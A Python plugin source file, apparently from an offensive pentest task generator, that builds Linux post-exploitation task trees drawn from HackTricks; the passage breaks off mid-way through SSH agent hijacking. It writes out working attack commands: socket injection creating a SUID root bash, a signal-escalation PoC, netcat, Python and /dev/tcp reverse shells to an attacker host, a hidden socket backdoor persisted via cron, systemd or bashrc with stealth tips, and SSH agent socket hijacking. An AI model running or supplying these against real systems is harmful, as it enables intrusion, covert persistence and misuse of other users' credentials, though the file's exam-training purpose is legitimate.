"""
Linux Persistence & Backdoor Mechanisms Plugin

Generates tasks for Linux persistence techniques including:
- Unix socket command injection and exploitation
- SSH agent forwarding hijacking
- Named pipe backdoors
- Signal-based privilege escalation
- Socket-based root access mechanisms

Extracted from HackTricks:
- linux-hardening/privilege-escalation/socket-command-injection.md
- linux-hardening/privilege-escalation/ssh-forward-agent-exploitation.md

Generated by: CrackPot v1.0
Date: 2025-10-07
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LinuxPersistencePlugin(ServicePlugin):
    """Linux persistence and backdoor techniques plugin"""

    @property
    def name(self) -> str:
        return "linux-persistence"

    @property
    def default_ports(self) -> List[int]:
        # This is a post-exploitation plugin - no default ports
        return []

    @property
    def service_names(self) -> List[str]:
        return ['linux-persistence', 'linux-backdoor', 'post-exploit-persistence']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """This plugin is manually triggered for post-exploitation scenarios"""
        # Manually triggered - not auto-detected from port scans
        return False

    def detect_from_finding(self, finding: Dict[str, Any], profile=None) -> int:
        """
        Detect Linux persistence activation from findings

        Activates on:
        - Root shell obtained (perfect match)
        - High privilege shell on Linux (high confidence)
        - Sudo permissions found (high confidence)

        Returns:
            int: Confidence score (0-100)
        """
        from ..core.constants import FindingTypes
        import logging
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Root shell obtained
        if finding_type == FindingTypes.ROOT_SHELL:
            logger.info("Linux persistence activating: Root shell obtained")
            return 100

        # High confidence - High privilege shell on Linux
        if finding_type == FindingTypes.HIGH_PRIVILEGE_SHELL:
            linux_hints = ['linux', 'root', 'uid=0', '/root/']
            if any(hint in description for hint in linux_hints):
                logger.info("Linux persistence activating: High privilege Linux shell")
                return 95

        # High confidence - System shell (typically root equivalent)
        if finding_type == FindingTypes.SYSTEM_SHELL:
            return 90

        # High confidence - Sudo permissions found
        if finding_type == FindingTypes.SUDO_PERMISSION_FOUND:
            logger.info("Linux persistence activating: Sudo permissions found")
            return 80

        # Medium - Admin shell that might be Linux
        if finding_type == FindingTypes.ADMIN_SHELL:
            if 'linux' in description or 'unix' in description:
                return 70

        return 0

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux persistence and backdoor enumeration task tree

        Args:
            target: Target IP/hostname
            port: Not used (post-exploitation plugin)
            service_info: Should contain 'persistence_type' (optional):
                          'full' - all techniques (default)
                          'sockets' - socket-based only
                          'ssh' - SSH agent exploitation only
        """
        persistence_type = service_info.get('persistence_type', 'full')

        tasks = {
            'id': 'linux-persistence-enum',
            'name': f'Linux Persistence & Backdoor Mechanisms ({target})',
            'type': 'parent',
            'children': []
        }

        # Add socket-based persistence tasks
        if persistence_type in ['full', 'sockets']:
            tasks['children'].append(self._get_socket_persistence_tasks(target))

        # Add SSH agent hijacking tasks
        if persistence_type in ['full', 'ssh']:
            tasks['children'].append(self._get_ssh_agent_tasks(target))

        # Add named pipe backdoor tasks
        if persistence_type in ['full', 'pipes']:
            tasks['children'].append(self._get_named_pipe_tasks(target))

        # Add general persistence enumeration
        if persistence_type == 'full':
            tasks['children'].append(self._get_general_persistence_enum(target))

        return tasks

    def _get_socket_persistence_tasks(self, target: str) -> Dict[str, Any]:
        """Generate Unix socket-based persistence and exploitation tasks"""
        return {
            'id': 'socket-persistence',
            'name': 'Unix Socket Persistence & Command Injection',
            'type': 'parent',
            'children': [
                # TASK 1: Enumerate Unix Sockets
                {
                    'id': 'enum-unix-sockets',
                    'name': 'Enumerate Unix Sockets',
                    'type': 'command',
                    'metadata': {
                        'command': 'netstat -a -p --unix 2>/dev/null | grep -v "^Proto"',
                        'description': 'Discover active Unix domain sockets on target system',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'POST_EXPLOIT'],
                        'flag_explanations': {
                            '-a': 'Show all sockets (listening and non-listening)',
                            '-p': 'Show PID and program name owning socket',
                            '--unix': 'Display only Unix domain sockets (local IPC)',
                            '2>/dev/null': 'Suppress permission denied errors',
                            'grep -v': 'Filter out header line'
                        },
                        'success_indicators': [
                            'Socket paths displayed (e.g., /tmp/*.sock, /var/run/*.socket)',
                            'Privileged sockets owned by root visible',
                            'Application sockets discovered (/tmp/app.sock, /var/run/service.socket)'
                        ],
                        'failure_indicators': [
                            'No sockets listed (unlikely on active system)',
                            'Permission denied for all sockets (limited user)',
                            'netstat not available (use ss -xlp instead)'
                        ],
                        'next_steps': [
                            'Identify root-owned sockets with world-writable permissions',
                            'Test socket connections with socat or nc',
                            'Look for application sockets in /tmp (often misconfigured)',
                            'Check socket file permissions: ls -la /path/to/socket'
                        ],
                        'alternatives': [
                            'ss -xlp unix (modern alternative to netstat)',
                            'lsof -U (list open Unix sockets)',
                            'find /tmp /var/run -type s 2>/dev/null (find socket files)',
                            'ls -la /tmp/*.sock /var/run/*.socket (manual check)'
                        ],
                        'notes': 'Unix domain sockets provide IPC on Linux. Root-owned sockets accepting untrusted input are prime privilege escalation targets. Look for writable sockets, especially in /tmp.',
                        'estimated_time': '1-2 minutes'
                    }
                },

                # TASK 2: Test Socket Permissions
                {
                    'id': 'test-socket-permissions',
                    'name': 'Test Unix Socket Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /tmp /var/run -type s -perm -o+w 2>/dev/null | while read sock; do ls -la "$sock"; done',
                        'description': 'Find world-writable Unix sockets (potential injection targets)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'find /tmp /var/run': 'Search common socket directories',
                            '-type s': 'Find only socket files (not regular files)',
                            '-perm -o+w': 'World-writable permission (any user can write)',
                            '2>/dev/null': 'Suppress permission errors',
                            'while read sock': 'Loop through each found socket',
                            'ls -la': 'Show detailed permissions and ownership'
                        },
                        'success_indicators': [
                            'World-writable sockets found (srwxrwxrwx)',
                            'Root-owned sockets with write access',
                            'Application sockets in /tmp with lax permissions'
                        ],
                        'failure_indicators': [
                            'No world-writable sockets found (secure system)',
                            'All sockets restricted to owner only'
                        ],
                        'next_steps': [
                            'Test connection to writable sockets',
                            'Identify which process owns the socket (netstat -ap)',
                            'Attempt socket command injection',
                            'Check socket protocol (stream vs datagram)'
                        ],
                        'alternatives': [
                            'Manual: ls -la /tmp/*.sock',
                            'Manual: stat /var/run/*.socket',
                            'find / -type s -writable 2>/dev/null (find all writable sockets)'
                        ],
                        'notes': 'World-writable sockets are dangerous if owned by privileged processes. Common pattern: chmod o+w /tmp/socket for testing, never removed in production.',
                        'estimated_time': '2-3 minutes'
                    }
                },

                # TASK 3: Socket Command Injection Test
                {
                    'id': 'socket-command-injection',
                    'name': 'Test Socket Command Injection',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo "whoami" | socat - UNIX-CLIENT:/tmp/target.sock',
                        'description': 'Test Unix socket for command injection vulnerability',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            'echo "whoami"': 'Test command to send to socket',
                            'socat': 'Multipurpose relay tool for socket communication',
                            '-': 'Read from stdin (the echoed command)',
                            'UNIX-CLIENT:/tmp/target.sock': 'Connect as client to Unix socket',
                            '/tmp/target.sock': 'Target socket path (REPLACE with actual path)'
                        },
                        'success_indicators': [
                            'Command output returned (e.g., "root" from whoami)',
                            'Socket accepts and executes arbitrary commands',
                            'Privileged user context (root) output'
                        ],
                        'failure_indicators': [
                            'Connection refused (socket not listening)',
                            'No output returned (socket not command injection vulnerable)',
                            'Permission denied',
                            'Socket closed immediately'
                        ],
                        'next_steps': [
                            'If vulnerable: Escalate to SUID binary creation',
                            'Test with: id, cat /etc/shadow, whoami',
                            'Create reverse shell through socket',
                            'Deploy persistence backdoor'
                        ],
                        'alternatives': [
                            'echo "id" | nc -U /tmp/target.sock (netcat Unix socket)',
                            'Manual socket test: python -c "import socket; s=socket.socket(socket.AF_UNIX); s.connect(\'/tmp/target.sock\'); s.send(b\'id\\n\'); print(s.recv(1024))"',
                            'socat STDIO UNIX-CONNECT:/tmp/target.sock (interactive)'
                        ],
                        'notes': 'Replace /tmp/target.sock with discovered writable socket path. Classic vulnerability: socket accepting input passed to os.system(), exec(), or similar. HackTricks example uses socket_test.s.',
                        'estimated_time': '2-3 minutes per socket'
                    }
                },

                # TASK 4: SUID Binary via Socket Injection
                {
                    'id': 'socket-suid-exploit',
                    'name': 'Exploit Socket Injection for SUID Binary',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'create-suid-via-socket',
                            'name': 'Create SUID Binary via Socket',
                            'type': 'command',
                            'metadata': {
                                'command': 'echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/vulnerable.sock',
                                'description': 'Exploit command injection socket to create SUID root bash (privilege escalation)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                                'flag_explanations': {
                                    'cp /bin/bash /tmp/bash': 'Copy bash binary to writable location',
                                    'chmod +s /tmp/bash': 'Set SUID bit (runs as owner - root)',
                                    'chmod +x /tmp/bash': 'Make executable',
                                    ';': 'Chain commands together',
                                    'socat - UNIX-CLIENT': 'Send commands to Unix socket'
                                },
                                'success_indicators': [
                                    '/tmp/bash created with SUID bit: -rwsr-sr-x',
                                    'File owned by root:root',
                                    'Executable by current user'
                                ],
                                'failure_indicators': [
                                    '/tmp/bash not created (command failed)',
                                    'SUID bit not set (nosuid mount flag)',
                                    'Permission denied (socket not privileged)'
                                ],
                                'next_steps': [
                                    'Execute SUID bash: /tmp/bash -p',
                                    'Verify root shell: id (should show uid=0)',
                                    'Read root flag: cat /root/proof.txt',
                                    'Establish persistent root access'
                                ],
                                'alternatives': [
                                    'Create with nc: echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" | nc -U /tmp/vulnerable.sock',
                                    'Use sh instead: cp /bin/sh /tmp/sh; chmod +s /tmp/sh',
                                    'Python exploit: Use socket library to send commands programmatically'
                                ],
                                'notes': 'CRITICAL OSCP TECHNIQUE. Replace /tmp/vulnerable.sock with actual vulnerable socket. Verify nosuid not set on /tmp: mount | grep /tmp. Execute with: /tmp/bash -p (preserve privileges).',
                                'estimated_time': '3-5 minutes'
                            }
                        },
                        {
                            'id': 'execute-suid-shell',
                            'name': 'Execute SUID Shell',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Execute the SUID binary to gain root shell',
                                'alternatives': [
                                    '/tmp/bash -p (preserve SUID privileges)',
                                    '/tmp/bash -p -i (interactive root shell)',
                                    'Verify root: /tmp/bash -p -c "whoami; id"'
                                ],
                                'success_indicators': [
                                    'Root shell obtained (# prompt)',
                                    'id shows uid=0(root)',
                                    'Can read /etc/shadow, /root files'
                                ],
                                'failure_indicators': [
                                    'Bash drops privileges (missing -p flag)',
                                    'Still running as user (check id)',
                                    'nosuid mount flag blocks SUID'
                                ],
                                'next_steps': [
                                    'Capture root flag',
                                    'Add SSH key to /root/.ssh/authorized_keys',
                                    'Create additional backdoors',
                                    'Clean up /tmp/bash if stealth required'
                                ],
                                'tags': ['OSCP:HIGH', 'PRIVESC', 'MANUAL'],
                                'notes': 'MUST use -p flag or bash drops privileges. Equivalent: /tmp/bash --norc -p. For sh: /tmp/sh -p. Screenshot proof for OSCP report.',
                                'estimated_time': '1 minute'
                            }
                        }
                    ]
                },

                # TASK 5: Signal-Based Socket Escalation (LG WebOS Case Study)
                {
                    'id': 'signal-socket-escalation',
                    'name': 'Signal-Based Socket Privilege Escalation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'identify-signal-sockets',
                            'name': 'Identify Signal-Controlled Sockets',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Identify root-owned sockets accepting TID (thread ID) and signal-based requests',
                                'alternatives': [
                                    'Review socket paths: /tmp/remotelogger, /var/run/privileged.sock',
                                    'Test socket interaction: echo "test" | socat - UNIX-CLIENT:/tmp/socket',
                                    'Reverse engineer daemon handling socket',
                                    'Check for pattern: socket accepts packed TID + signal delivery'
                                ],
                                'success_indicators': [
                                    'Root-owned socket found accepting external input',
                                    'Socket couples actions to thread IDs and signals',
                                    'Privileged operations triggered by client-supplied TID'
                                ],
                                'failure_indicators': [
                                    'No sockets match pattern',
                                    'Socket validates credentials (secure implementation)',
                                    'Cannot influence TID targeting'
                                ],
                                'next_steps': [
                                    'Develop Python exploit to send TID + padding',
                                    'Trigger signal to target thread',
                                    'Combine with named pipe reverse shell'
                                ],
                                'tags': ['OSCP:LOW', 'RESEARCH', 'ADVANCED'],
                                'notes': 'Case study from LG WebOS TV exploit (SSD-2020-004). Rare but demonstrates signal-based privilege escalation via Unix sockets. Pattern: unprivileged client sends TID → daemon binds privileged action to that TID → client sends signal → escalation.',
                                'estimated_time': '30+ minutes (research-heavy)'
                            }
                        },
                        {
                            'id': 'signal-socket-poc',
                            'name': 'Signal-Socket Exploitation PoC',
                            'type': 'command',
                            'metadata': {
                                'command': '''python3 << 'EOF'
import socket, struct, os, threading, time

# Spawn thread to obtain native TID
th = threading.Thread(target=time.sleep, args=(600,))
th.start()
tid = th.native_id  # Python >= 3.8

# Connect to vulnerable socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")  # REPLACE with actual socket

# Send TID + padding (protocol-specific)
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # Wait for acknowledgement

# Deliver signal to trigger privileged action
os.kill(tid, 4)  # SIGILL - REPLACE with actual signal

print(f"[+] Exploit sent to TID {tid}")
s.close()
EOF''',
                                'description': 'Python PoC for signal-based socket privilege escalation (LG WebOS pattern)',
                                'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED', 'RESEARCH'],
                                'flag_explanations': {
                                    'threading.Thread': 'Create thread to obtain valid TID',
                                    'th.native_id': 'Get native thread ID (Linux TID)',
                                    'socket.AF_UNIX': 'Unix domain socket family',
                                    'struct.pack(\'<L\', tid)': 'Pack TID as little-endian unsigned long',
                                    'b\'A\'*0x80': 'Padding (protocol-specific, adjust as needed)',
                                    's.recv(4)': 'Synchronization - wait for daemon acknowledgement',
                                    'os.kill(tid, 4)': 'Send SIGILL (signal 4) to TID - triggers exploit'
                                },
                                'success_indicators': [
                                    'Privileged code path triggered',
                                    'Reverse shell received as root',
                                    'Root access obtained'
                                ],
                                'failure_indicators': [
                                    'Connection refused',
                                    'Signal ignored (no handler bound)',
                                    'No privilege escalation',
                                    'Daemon crashes (wrong signal/padding)'
                                ],
                                'next_steps': [
                                    'Set up named pipe reverse shell first',
                                    'Adjust TID packing format (check target architecture)',
                                    'Try different signals (SIGILL=4, SIGUSR1=10, SIGUSR2=12)',
                                    'Reverse engineer daemon for correct protocol'
                                ],
                                'alternatives': [
                                    'Manual reverse engineering of daemon binary',
                                    'Fuzzing socket input to discover protocol',
                                    'Check for CVE/exploits specific to daemon'
                                ],
                                'notes': 'ADVANCED TECHNIQUE - not common in OSCP but demonstrates socket attack surface. Based on SSD-2020-004 (LG WebOS). Key vulnerability: trusting client-supplied TIDs for privileged operations. Requires Python 3.8+ for native_id. Replace /tmp/remotelogger and signal number with actual values.',
                                'estimated_time': '1+ hour (research + adaptation)'
                            }
                        }
                    ]
                },

                # TASK 6: Named Pipe Reverse Shell (Socket Exploitation Support)
                {
                    'id': 'named-pipe-backdoor',
                    'name': 'Named Pipe Reverse Shell Backdoor',
                    'type': 'command',
                    'metadata': {
                        'command': '''# On target (via socket injection or shell):
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f

# On attacker:
nc -nlvp <LPORT>''',
                        'description': 'Create named pipe reverse shell backdoor for socket-based exploitation',
                        'tags': ['OSCP:HIGH', 'BACKDOOR', 'POST_EXPLOIT'],
                        'flag_explanations': {
                            'rm -f /tmp/f': 'Remove existing named pipe if present',
                            'mkfifo /tmp/f': 'Create named pipe (FIFO - First In First Out)',
                            'cat /tmp/f': 'Read from named pipe (blocks until data available)',
                            '|': 'Pipe output to shell',
                            '/bin/sh -i': 'Interactive shell',
                            '2>&1': 'Redirect stderr to stdout (capture errors)',
                            'nc <LHOST> <LPORT>': 'Send shell output to attacker listener',
                            '> /tmp/f': 'Write listener input back to pipe (creates loop)'
                        },
                        'success_indicators': [
                            'Named pipe created: ls -la /tmp/f shows prw-',
                            'Netcat connection established to attacker',
                            'Interactive shell on attacker listener'
                        ],
                        'failure_indicators': [
                            'mkfifo: command not found',
                            'nc connection refused (wrong IP/port)',
                            'Firewall blocking outbound connection',
                            'Shell terminates immediately'
                        ],
                        'next_steps': [
                            'Stabilize shell: python -c "import pty; pty.spawn(\'/bin/bash\')"',
                            'Upgrade to SSH access',
                            'Create persistent backdoor',
                            'Clean /tmp/f when done (stealth)'
                        ],
                        'alternatives': [
                            'Python reverse shell: python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'<LHOST>\',<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
                            'Bash reverse shell: bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1',
                            'Perl reverse shell: perl -e \'use Socket;...\'',
                            'No mkfifo: Use /dev/tcp directly (if bash supports it)'
                        ],
                        'notes': 'Classic named pipe backdoor from HackTricks socket exploitation section. Replace <LHOST> with attacker IP (192.168.45.X) and <LPORT> with listener port (4444). Works with socket injection by sending this as multi-line command. Start listener BEFORE triggering backdoor.',
                        'estimated_time': '2-3 minutes'
                    }
                },

                # TASK 7: Socket Backdoor Persistence
                {
                    'id': 'socket-backdoor-persistence',
                    'name': 'Create Persistent Socket Backdoor',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'create-socket-backdoor-script',
                            'name': 'Create Socket Backdoor Script',
                            'type': 'command',
                            'metadata': {
                                'command': '''cat > /tmp/.backdoor.py << 'BACKDOOR'
#!/usr/bin/env python3
import socket
import os
import subprocess

SOCKET_PATH = "/tmp/.hidden.sock"

if os.path.exists(SOCKET_PATH):
    os.remove(SOCKET_PATH)

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(SOCKET_PATH)
os.chmod(SOCKET_PATH, 0o777)  # World-writable

print(f"[*] Backdoor listening on {SOCKET_PATH}")

while True:
    server.listen(1)
    conn, addr = server.accept()
    data = conn.recv(1024).decode().strip()

    if data:
        try:
            output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
            conn.send(output)
        except Exception as e:
            conn.send(str(e).encode())

    conn.close()
BACKDOOR

chmod +x /tmp/.backdoor.py
python3 /tmp/.backdoor.py &''',
                                'description': 'Create persistent Unix socket command execution backdoor',
                                'tags': ['OSCP:MEDIUM', 'BACKDOOR', 'POST_EXPLOIT', 'PERSISTENCE'],
                                'flag_explanations': {
                                    'cat > /tmp/.backdoor.py': 'Create backdoor script (hidden with . prefix)',
                                    '<< \'BACKDOOR\'': 'Heredoc - write multi-line script',
                                    'socket.AF_UNIX': 'Unix domain socket',
                                    'os.chmod(SOCKET_PATH, 0o777)': 'Make socket world-writable',
                                    'subprocess.check_output': 'Execute received command',
                                    'shell=True': 'Enable shell features (pipes, redirects)',
                                    'stderr=subprocess.STDOUT': 'Capture errors in output',
                                    '&': 'Run backdoor in background'
                                },
                                'success_indicators': [
                                    'Script created: ls -la /tmp/.backdoor.py',
                                    'Socket listening: netstat -a --unix | grep hidden',
                                    'Can send commands: echo "id" | socat - UNIX-CLIENT:/tmp/.hidden.sock'
                                ],
                                'failure_indicators': [
                                    'Python not available',
                                    'Permission denied creating script',
                                    'Socket already in use'
                                ],
                                'next_steps': [
                                    'Test backdoor: echo "whoami" | socat - UNIX-CLIENT:/tmp/.hidden.sock',
                                    'Add to cron for persistence',
                                    'Hide process with process name manipulation',
                                    'Clean up: rm /tmp/.backdoor.py /tmp/.hidden.sock'
                                ],
                                'alternatives': [
                                    'Use /dev/shm instead of /tmp (memory-backed, no disk traces)',
                                    'Bind to existing system socket path for camouflage',
                                    'Use abstract socket (no filesystem entry): server.bind("\\x00hidden")',
                                    'Implement authentication to prevent detection'
                                ],
                                'notes': 'Educational backdoor demonstrating socket command injection vulnerability. In real engagement: (1) Use abstract socket to avoid filesystem, (2) Implement auth, (3) Encrypt traffic, (4) Use legitimate-looking paths. This is the vulnerability pattern from HackTricks socket-command-injection.md.',
                                'estimated_time': '5-10 minutes'
                            }
                        },
                        {
                            'id': 'socket-backdoor-cron',
                            'name': 'Add Socket Backdoor to Cron',
                            'type': 'command',
                            'metadata': {
                                'command': '''# Add to user crontab
(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/.backdoor.py") | crontab -

# OR add to system cron (requires root)
echo "@reboot root python3 /tmp/.backdoor.py" >> /etc/crontab''',
                                'description': 'Persist socket backdoor via cron (survives reboot)',
                                'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'BACKDOOR'],
                                'flag_explanations': {
                                    'crontab -l': 'List current user crontab',
                                    '2>/dev/null': 'Suppress "no crontab" error',
                                    '@reboot': 'Run command at system boot',
                                    '| crontab -': 'Write combined output back to crontab',
                                    '/etc/crontab': 'System-wide cron table (root required)'
                                },
                                'success_indicators': [
                                    'Crontab updated: crontab -l shows @reboot entry',
                                    'Backdoor survives reboot test',
                                    'Socket recreated after boot'
                                ],
                                'failure_indicators': [
                                    'Permission denied (crontab restricted)',
                                    'Backdoor not running after reboot',
                                    'Cron not installed/running'
                                ],
                                'next_steps': [
                                    'Test persistence: reboot target and verify socket',
                                    'Add multiple persistence methods',
                                    'Monitor cron logs: grep CRON /var/log/syslog'
                                ],
                                'alternatives': [
                                    'Systemd service: create .service file in /etc/systemd/system/',
                                    'init.d script: /etc/init.d/backdoor',
                                    'rc.local: echo "python3 /tmp/.backdoor.py &" >> /etc/rc.local',
                                    'User .bashrc: echo "python3 /tmp/.backdoor.py &" >> ~/.bashrc'
                                ],
                                'notes': 'Cron persistence works on most Linux systems. Systemd preferred on modern distros. For OSCP: demonstrate understanding of multiple persistence mechanisms. Clean up after exam!',
                                'estimated_time': '2-3 minutes'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_ssh_agent_tasks(self, target: str) -> Dict[str, Any]:
        """Generate SSH agent forwarding exploitation tasks"""
        return {
            'id': 'ssh-agent-hijack',
            'name': 'SSH Agent Forwarding Hijacking',
            'type': 'parent',
            'children': [
                # TASK 1: Check SSH Agent Forwarding Configuration
                {
                    'id': 'check-agent-forwarding',
                    'name': 'Check SSH Agent Forwarding Config',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Check system-wide SSH config
cat /etc/ssh/ssh_config | grep -i ForwardAgent

# Check user SSH config
cat ~/.ssh/config 2>/dev/null | grep -i ForwardAgent

# Check active SSH sessions
ps aux | grep "ssh.*-A\\|ssh.*ForwardAgent"''',
                        'description': 'Identify if SSH agent forwarding is enabled (allows key hijacking)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                        'flag_explanations': {
                            'ForwardAgent yes': 'SSH agent forwarding enabled (CRITICAL)',
                            '/etc/ssh/ssh_config': 'System-wide SSH client configuration',
                            '~/.ssh/config': 'User-specific SSH client configuration',
                            'grep -i': 'Case-insensitive search',
                            'ps aux': 'List all processes',
                            'ssh.*-A': 'SSH sessions using -A flag (agent forwarding)'
                        },
                        'success_indicators': [
                            'ForwardAgent yes found in config',
                            'Active SSH sessions with -A flag',
                            'Agent sockets in /tmp/ssh-* directories'
                        ],
                        'failure_indicators': [
                            'ForwardAgent not configured or set to "no"',
                            'No active SSH sessions',
                            'No agent sockets found'
                        ],
                        'next_steps': [
                            'If ForwardAgent yes: Check for SSH agent sockets',
                            'Enumerate active SSH connections',
                            'Test agent hijacking if root access available',
                            'Review who is using agent forwarding: w, who'
                        ],
                        'alternatives': [
                            'Manual config check: cat /etc/ssh/ssh_config',
                            'Check environment: env | grep SSH_AUTH_SOCK',
                            'Find agent sockets: find /tmp -name "agent.*" -type s 2>/dev/null'
                        ],
                        'notes': 'SSH agent forwarding (ForwardAgent yes) allows SSH keys to be used on remote systems without copying them. If you gain root access, you can hijack forwarded agents to access other systems using victim\'s keys. HIGH OSCP RELEVANCE for lateral movement.',
                        'estimated_time': '2-3 minutes'
                    }
                },

                # TASK 2: Enumerate SSH Agent Sockets
                {
                    'id': 'enum-ssh-agent-sockets',
                    'name': 'Enumerate SSH Agent Sockets',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Find agent sockets in /tmp
find /tmp -type s -name "agent.*" 2>/dev/null

# Alternative: check SSH socket directory pattern
ls -la /tmp/ssh-*/agent.* 2>/dev/null

# Show socket details with ownership
find /tmp -type s -name "agent.*" -exec ls -la {} \\; 2>/dev/null

# Check current user's SSH_AUTH_SOCK
echo $SSH_AUTH_SOCK''',
                        'description': 'Locate SSH agent sockets for hijacking (requires root or same user)',
                        'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'find /tmp': 'Search /tmp directory (common agent socket location)',
                            '-type s': 'Find Unix socket files',
                            '-name "agent.*"': 'Match SSH agent socket naming pattern',
                            'ssh-*/agent.*': 'SSH creates directories like /tmp/ssh-ABC123/agent.456',
                            '-exec ls -la {} \\;': 'Execute ls on each found socket',
                            'SSH_AUTH_SOCK': 'Environment variable pointing to agent socket'
                        },
                        'success_indicators': [
                            'Agent sockets found (e.g., /tmp/ssh-haqzR16816/agent.16816)',
                            'Sockets owned by other users (hijacking targets)',
                            'Multiple active agent sockets (active SSH sessions)'
                        ],
                        'failure_indicators': [
                            'No agent sockets found',
                            'Only own user\'s sockets visible',
                            'Permission denied (not root)'
                        ],
                        'next_steps': [
                            'If root: Hijack other users\' agent sockets',
                            'Test agent access: SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.YYY ssh-add -l',
                            'Identify socket owners: stat /tmp/ssh-XXX/agent.YYY',
                            'Attempt SSH using hijacked agent'
                        ],
                        'alternatives': [
                            'Manual: ls -laR /tmp | grep agent',
                            'lsof | grep SSH_AUTH_SOCK (show processes using sockets)',
                            'netstat -a --unix | grep agent (list agent sockets)'
                        ],
                        'notes': 'SSH agent sockets are Unix domain sockets containing decrypted SSH private keys. Agent forwarding creates sockets accessible to root. Format: /tmp/ssh-RANDOM/agent.PID. HackTricks pattern from ssh-forward-agent-exploitation.md.',
                        'estimated_time': '1-2 minutes'
                    }
                },

                # TASK 3: SSH Agent Hijacking
                {
                    'id': 'hijack-ssh-agent',
                    'name': 'Hijack SSH Agent Socket',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'test-agent-keys',
                            'name': 'List Keys in Hijacked Agent',
                            'type': 'command',
                            'metadata': {
                                'command': '''# Set SSH_AUTH_SOCK to target agent
export SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816

# List loaded SSH keys
ssh-add -l

# Show key fingerprints and comments
ssh-add -L''',
                                'description': 'Access SSH keys from hijacked agent socket (requires root or same user)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC', 'LATERAL'],
                                'flag_explanations': {
                                    'export SSH_AUTH_SOCK': 'Point SSH client to target agent socket',
                                    '/tmp/ssh-haqzR16816/agent.16816': 'Target socket path (REPLACE with actual)',
                                    'ssh-add -l': 'List fingerprints of loaded SSH keys',
                                    'ssh-add -L': 'Show public keys in OpenSSH format (includes comment/email)',
                                    'fingerprint': 'Key identifier (e.g., SHA256:xyz... user@host)'
                                },
                                'success_indicators': [
                                    'SSH keys listed (not empty)',
                                    'Key fingerprints displayed',
                                    'User/host information visible in comments',
                                    'No authentication error'
                                ],
                                'failure_indicators': [
                                    'Could not open a connection to your authentication agent',
                                    'The agent has no identities',
                                    'Permission denied (not root)',
                                    'Socket not found'
                                ],
                                'next_steps': [
                                    'Note key comments (user@hostname)',
                                    'Attempt SSH to known hosts using agent',
                                    'Test lateral movement to other systems',
                                    'Extract private key from agent memory (advanced)'
                                ],
                                'alternatives': [
                                    'Manual socket test: SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.YYY ssh user@host',
                                    'Script multiple sockets: for sock in /tmp/ssh-*/agent.*; do SSH_AUTH_SOCK=$sock ssh-add -l; done',
                                    'Key extraction: Use agent memory dump tools (gdb, ptrace)'
                                ],
                                'notes': 'CRITICAL OSCP LATERAL MOVEMENT TECHNIQUE. If you gain root on system with agent forwarding, you can impersonate SSH users. Private keys are stored decrypted in agent memory. Pattern from HackTricks: SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston',
                                'estimated_time': '2-3 minutes'
                            }
                        },
                        {
                            'id': 'ssh-with-hijacked-agent',
                            'name': 'SSH Using Hijacked Agent',
                            'type': 'command',
                            'metadata': {
                                'command': '''# Set agent socket
export SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816

# SSH to target using victim's keys
ssh bob@192.168.45.200

# Alternative: One-liner
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@192.168.45.200''',
                                'description': 'Authenticate to remote systems using hijacked SSH agent keys',
                                'tags': ['OSCP:HIGH', 'LATERAL', 'EXPLOIT'],
                                'flag_explanations': {
                                    'export SSH_AUTH_SOCK': 'Use target agent for SSH authentication',
                                    'ssh bob@192.168.45.200': 'SSH to target as user bob',
                                    'One-liner': 'Set environment variable for single command'
                                },
                                'success_indicators': [
                                    'SSH connection established without password',
                                    'Shell access on target system',
                                    'Lateral movement achieved',
                                    'No key passphrase required'
                                ],
                                'failure_indicators': [
                                    'Permission denied (publickey)',
                                    'Connection refused (target not accessible)',
